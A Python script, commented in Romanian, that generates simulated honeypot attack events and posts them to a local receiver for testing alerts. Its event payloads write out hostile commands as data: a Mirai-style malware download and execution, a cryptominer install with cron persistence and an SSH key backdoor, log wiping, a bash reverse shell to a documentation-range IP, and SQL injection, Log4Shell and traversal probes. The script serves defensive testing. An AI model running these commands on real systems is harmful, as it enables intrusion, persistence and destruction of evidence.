# generator.py - trimite atacuri SIMULATE la receiver.py, ca sa vezi alerte fara agent si fara Kali.
#
# Porneste intai receiver.py (si dashboard-ul, daca vrei), apoi:
#   python generator.py                    20 de atacuri, cate unul pe secunda
#   python generator.py --atacuri 100 --pauza 0.2
#   python generator.py --continuu         la nesfarsit, pana dai Ctrl+C
#   python generator.py --fisier test.jsonl   scrie intr-un fisier in loc sa trimita (pentru main.py)
#
# Evenimentele arata exact ca cele trimise de agentul Go, plus "simulated": true.
# IP-urile sunt alese la intamplare; link-urile de malware sunt in 203.0.113.0/24 (rezervat, nu exista).

import argparse
import ipaddress
import json
import random
import secrets
import time
import urllib.request
from datetime import datetime, timedelta, timezone

PORTS = {"SSH": 22, "TELNET": 23, "FTP": 21, "HTTP": 80}
NODES = {"SSH": "ssh-01", "TELNET": "telnet-01", "FTP": "ftp-01", "HTTP": "http-01"}

WRONG_PASSWORDS = ["123456789", "qwerty", "letmein", "toor", "raspberry", "ubuntu", "dragon", "monkey", "iloveyou", "pass123"]
MIRAI_PASSWORDS = ["xc3511", "vizxv", "888888", "xmhdipc", "default", "juantech", "54321", "666666"]

# "botnetul" plantat: aceleasi IP-uri apar in mai multe atacuri si descarca de pe acelasi server
BOTNET_IPS = []
BOTNET_SERVER = "203.0.113.66"


def random_public_ip():
    while True:
        ip = ipaddress.ip_address(random.randint(1, 2**32 - 1))
        if ip.is_global and not ip.is_multicast:
            return str(ip)


def attacker_ip():
    """De cele mai multe ori un IP nou; uneori unul din botnet."""
    if BOTNET_IPS and random.random() < 0.3:
        return random.choice(BOTNET_IPS)
    return random_public_ip()


class Attack:
    """Construieste evenimentele unei singure conexiuni a unui atacator."""

    def __init__(self, ip, protocol):
        self.ip = ip
        self.protocol = protocol
        self.port = random.randint(30000, 65000)
        self.session_id = secrets.token_hex(8)
        self.clock = datetime.now(timezone.utc)
        self.events = []

    def timestamp(self):
        self.clock = self.clock + timedelta(milliseconds=random.randint(200, 1500))
        return self.clock.strftime("%Y-%m-%dT%H:%M:%S.") + f"{self.clock.microsecond // 1000:03d}Z"

    def event(self, event_type):
        event = {
            "timestamp": self.timestamp(),
            "node_id": NODES[self.protocol],
            "event_type": event_type,
            "source_ip": self.ip,
            "source_port": self.port,
            "target_port": PORTS[self.protocol],
            "protocol": self.protocol,
            "simulated": True,
        }
        if self.protocol != "HTTP":
            event["session_id"] = self.session_id
        self.events.append(event)
        return event

    def start(self):
        self.event("session_start")

    def end(self):
        self.event("session_end")

    def login(self, user, password, success):
        event = self.event("login_attempt")
        event["credentials"] = {"username": user, "password": password, "success": success}

    def command(self, text, url=""):
        event = self.event("command_exec")
        event["payload_details"] = {"command": text}
        if url:
            event["payload_details"]["extracted_url"] = url

    def http(self, path, user_agent="Mozilla/5.0"):
        event = self.event("http_request")
        event["payload_details"] = {"http_method": "GET", "http_path": path, "http_user_agent": user_agent}


def ssh_bruteforce():
    """Incearca multe parole pe SSH; uneori nimereste una si se uita in jur."""
    attack = Attack(attacker_ip(), "SSH")
    attack.start()
    for password in random.sample(WRONG_PASSWORDS, random.randint(3, 9)):
        attack.login("root", password, False)
    if random.random() < 0.5:
        attack.login("root", "root", True)
        attack.command("uname -a; whoami && id")
        attack.command("cat /proc/cpuinfo | grep model")
    attack.end()
    return attack.events


def mirai_bot():
    """Bot IoT pe Telnet: parole din fabrica, testele Mirai, descarca malware pentru ARM."""
    attack = Attack(attacker_ip(), "TELNET")
    attack.start()
    attack.login("root", random.choice(WRONG_PASSWORDS), False)
    attack.login("root", random.choice(MIRAI_PASSWORDS), True)
    attack.command("enable")
    attack.command("/bin/busybox ECCHI")
    attack.command("echo -e '\\x6b\\x61\\x6d\\x69'")
    url = f"http://{BOTNET_SERVER}/bins/mirai.arm7"
    attack.command(f"cd /tmp; wget {url}; chmod +x mirai.arm7; ./mirai.arm7", url)
    attack.end()
    return attack.events


def crypto_miner():
    """Intra pe SSH, descarca un miner, il porneste, se asigura ca ramane si isi sterge urmele."""
    attack = Attack(attacker_ip(), "SSH")
    attack.start()
    attack.login("root", "123456", True)
    attack.command("uname -a; nproc; free -m")
    url = "http://203.0.113.20/xmrig.tar.gz"
    attack.command(f"cd /tmp && curl -s -O {url} && tar xzf xmrig.tar.gz", url)
    attack.command("nohup ./xmrig -o pool.example:3333 &")
    attack.command("echo '* * * * * /tmp/xmrig' | crontab -")
    attack.command("echo ssh-rsa AAAAB3Nza... >> ~/.ssh/authorized_keys")
    attack.command("history -c; rm -rf /var/log/*")
    attack.end()
    return attack.events


def reverse_shell():
    attack = Attack(attacker_ip(), "SSH")
    attack.start()
    attack.login("admin", "admin", True)
    attack.command("bash -i >& /dev/tcp/203.0.113.30/4444 0>&1")
    attack.end()
    return attack.events


def web_scanner():
    """Scanner web: cauta fisiere cu parole, panouri de administrare si vulnerabilitati cunoscute."""
    attack = Attack(attacker_ip(), "HTTP")
    paths = [
        "/", "/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/actuator/env",
        "/index.php?id=1%27%20OR%20%271%27=%271", "/?x=${jndi:ldap://203.0.113.40/a}",
        "/../../etc/passwd", "/shell.php?cmd=id",
    ]
    user_agent = random.choice(["sqlmap/1.8", "zgrab/0.x", "Mozilla/5.0 (compatible; Nuclei)"])
    for path in random.sample(paths, random.randint(3, 7)):
        attack.http(path, user_agent)
    return attack.events


def ftp_guess():
    attack = Attack(attacker_ip(), "FTP")
    attack.start()
    attack.login("anonymous", "guest@example.com", True)
    attack.command("PWD")
    attack.login("admin", "ftp", False)
    attack.end()
    return attack.events


SCENARIOS = [
    (ssh_bruteforce, 30),
    (mirai_bot, 25),
    (web_scanner, 20),
    (crypto_miner, 10),
    (ftp_guess, 10),
    (reverse_shell, 5),
]


def pick_scenario():
    """Alege un tip de atac, cu sanse dupa cat de des apare in realitate."""
    functions = []
    weights = []
    for function, weight in SCENARIOS:
        functions.append(function)
        weights.append(weight)
    return random.choices(functions, weights=weights)[0]


def send(url, token, events):
    data = json.dumps(events).encode("utf-8")
    request = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
    if token:
        request.add_header("Authorization", f"Bearer {token}")
    with urllib.request.urlopen(request, timeout=5) as response:
        return json.load(response)


def main():
    parser = argparse.ArgumentParser(description="trimite atacuri simulate la receiver.py")
    parser.add_argument("--url", default="http://127.0.0.1:8000/api/events")
    parser.add_argument("--token", default="", help="acelasi ca AGENT_TOKEN din receiver, daca e setat")
    parser.add_argument("--atacuri", type=int, default=20, help="cate atacuri sa trimita (implicit 20)")
    parser.add_argument("--pauza", type=float, default=1.0, help="secunde intre atacuri (implicit 1)")
    parser.add_argument("--continuu", action="store_true", help="trimite la nesfarsit, pana la Ctrl+C")
    parser.add_argument("--fisier", default="", help="scrie evenimentele in acest fisier JSONL in loc sa le trimita")
    args = parser.parse_args()

    for _ in range(8):
        BOTNET_IPS.append(random_public_ip())

    sent = 0
    try:
        while args.continuu or sent < args.atacuri:
            scenario = pick_scenario()
            events = scenario()

            if args.fisier:
                with open(args.fisier, "a", encoding="utf-8") as f:
                    for event in events:
                        f.write(json.dumps(event) + "\n")
                print(f"[{sent + 1}] {scenario.__name__:<15} {events[0]['source_ip']:<15} -> {len(events)} evenimente scrise")
            else:
                answer = send(args.url, args.token, events)
                print(f"[{sent + 1}] {scenario.__name__:<15} {events[0]['source_ip']:<15} -> "
                      f"{answer.get('received')} evenimente, {answer.get('alerts_generated')} alerte")

            sent += 1
            if args.pauza > 0 and (args.continuu or sent < args.atacuri):
                time.sleep(args.pauza)
    except KeyboardInterrupt:
        print("\noprit.")
    except OSError as error:
        print(f"\n[EROARE] nu pot trimite la {args.url}: {error}")
        print("Ai pornit receiver.py? (python receiver.py, in alt terminal)")
        return

    print(f"\nGata: {sent} atacuri simulate.")


if __name__ == "__main__":
    main()
